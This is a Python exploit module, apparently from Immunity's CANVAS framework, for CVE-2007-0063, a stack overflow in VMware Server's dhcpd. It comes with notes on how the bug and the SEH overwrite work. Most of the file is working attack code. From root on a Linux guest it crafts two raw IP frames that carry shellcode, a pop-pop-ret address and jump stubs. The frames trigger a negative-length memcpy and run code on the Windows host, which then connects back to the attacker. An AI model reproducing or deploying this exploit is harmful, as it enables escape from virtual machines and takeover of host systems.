#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *

from MOSDEF import mosdef
from ExploitTypes.localexploit import LocalExploit

# GUI info
NAME='VMware dhcpd Overflow'
DESCRIPTION='VMware dhcpd Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="VMWare"
DOCUMENTATION['Date public']='09/21/07'
DOCUMENTATION['References']='http://lists.vmware.com/pipermail/security-announce/2007/000001.html'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-0063'
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0063'
DOCUMENTATION['CVSS'] = 10.0

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']

NOTES="""
At the moment we only target a Linux guest inside a Windows host.

VmnetDhcp.exe uses raw socket to capture packets and parse them. Unfortunately (or not), it messes some
calculations when there is an inconsistency between the IP header length and the length of the packet
itself, resulting in a negative length memcpy() operation. A stack buffer will be copied upper in the stack
and thus repeat itself all the way up until a non writeable page is reached. Then an access violation is
triggered, but thanks to a small trick we have control over the SEH and can execute code on the host.

A first packet is sent with our shellcode and SEH data, it will fill the stack buffer and nothing more will
happen. By specifying a wrong IP header checksum, we ensure that the stack buffer won't get cleared. Then we
send a second packet, that will trigger the memcpy(). Since the packet has to be pretty small, it won't
erase the data we previously put in the stack.

So how it works? You get into a Linux virtual machine, either using a flaw or an account. You must have root
priviledges because it uses raw sockets. Then you launch the exploit and the Windows host will connect back
to you (be careful about getting the ports of the listeners right so that the Windows shellcode doesn't try
to connect back to the Linux MOSDEF listener).
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect (N/A)',0],
    1: ['VMware Server 1.0.3 on Windows XP SP2',0x7ffc0258], #pop&pop&ret
}

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name                = NAME
        self.version             = 1
        self.badstring           = ''
        self.subesp              = 0 #not necessary?
        self.supportedNodeArgs   = [['linuxNode']]
        self.use_local_interface = False

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createWin32Shellcode(self.badstring,self.callback.ip,self.callback.port)

    def getArgs(self):
        self.host=self.target.interface
        return

    def test(self):
        self.getArgs()
        self.log('%s testing host %s'%(self.name,self.host))
        #test for VMware version using I/O backdoor here?
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s (in progress)'%(NAME,self.host))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Could not determine version automatically')
                self.setInfo('%s attacking %s - done (failed!)'%(NAME,self.host))
                return 0
        self.info,self.eip=targets[self.version]
        self.log('Attacking %s'%(self.host))

        node=self.argsDict['passednodes'][0]
        if node.nodetype!='linuxNode':
            self.log('Currently nodes other than Linux Nodes are not supported for this exploit')
            return 0
        rawsock=node.shell.bindraw('eth0',0x800) # ETH_P_IP
        if rawsock<0:
            raise Exception,'Could not bind raw socket!'

        host=struct.unpack('>L',socket.inet_aton(self.host))[0]
        #frame1: if the checksum is invalid the stack buffer doesn't get cleared
        ethData=struct.pack('>BBHHHBBHLL',0x45,0,0x600,0x0000,0x4000,0x80,0x11,0x4242,host,host|0xff)
        ethData+='\0'*0x30 #required so that we foul some checks in next packet parsing
        ethData+=self.shellcode #shellcode goes here
        ethData+='A'*(0x386-len(self.shellcode)) #padding
        ethData+='\xeb\x06' #jmp forward goes here
        ethData+='BB'
        ethData+=struct.pack('<L',self.eip) #pop&pop&ret goes here
        ethData+=mosdef.assemble('jmp $-%d'%(0x386+8+5),'x86')
        ethData+='D'*(0x55c-0x386-8-5) #filling as much data as the ReadFile() allows
        srcAddr='\0'*6
        dstAddr='\xff'*6
        txFrame=struct.pack('>6s6sH',dstAddr,srcAddr,0x0800)+ethData
        node.shell.send(rawsock,txFrame)

        #frame2: ip header size bigger than packet size, good checksum, negative length memcpy()
        ethData=struct.pack('>BBHHHBBHLL',0x4c,0,0x34,0x0000,0x4000,0x80,0x11,0x4242,host,host|0xff)
        ethData+='A'*0x20 #bit of padding here, if the packet is too small it seems that our NIC or IP stack
                          #is padding it for us, leading to a size inconsistency detection in vmnetdhcp.exe
        csum=0
        size=(ord(ethData[0])&0xf)<<2 #ip header size in bytes
        for i in range(0,size,2): #calculate the correct checksum of the ip header as seen by vmware
            csum+=struct.unpack('>H',ethData[i:i+2])[0]
            if (csum>0xffff):
                csum-=0xffff
        ethData=ethData[:4]+struct.pack('>H',(~csum)&0xffff)+ethData[6:]
        txFrame=struct.pack('>6s6sH',dstAddr,srcAddr,0x0800)+ethData
        node.shell.send(rawsock,txFrame)

        time.sleep(4)
        if self.ISucceeded():
            self.setInfo('%s attacking %s - done (success!)'%(NAME,self.host))
            return 1
        else:
            self.setInfo('%s attacking %s - done (failed)'%(NAME,self.host))
            return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
